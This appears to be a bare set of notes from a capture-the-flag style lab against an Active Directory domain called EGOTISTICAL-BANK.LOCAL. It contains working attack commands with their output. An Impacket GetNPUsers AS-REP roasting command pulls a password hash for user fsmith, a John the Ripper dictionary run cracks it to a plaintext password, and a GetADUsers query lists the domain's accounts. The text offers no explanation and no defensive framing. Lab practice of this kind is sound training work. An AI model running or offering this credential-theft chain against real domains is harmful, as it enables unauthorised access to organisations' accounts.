python GetNPUsers.py -dc-ip 10.10.10.175 -format john EGOTISTICAL-BANK.LOCAL/fsmith -no-pass -outputfile smith.decode
john --fork=4 --format=krb5asrep --wordlist=~/Documents/Dictionaries/rockyou.txt smith.hash => Thestrokes23
python GetADUsers.py -all -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith
[*] Querying 10.10.10.175 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2020-01-25 01:14:15.321116  2020-02-11 00:16:17.478519 
Guest                                                 <never>              <never>             
krbtgt                                                2020-01-23 13:45:30.587720  <never>             
HSmith                                                2020-01-23 13:54:34.140321  <never>             
FSmith                                                2020-01-24 00:45:19.047096  2020-02-26 19:41:02.553252 
svc_loanmgr                                           2020-01-25 07:48:31.678079  <never>        
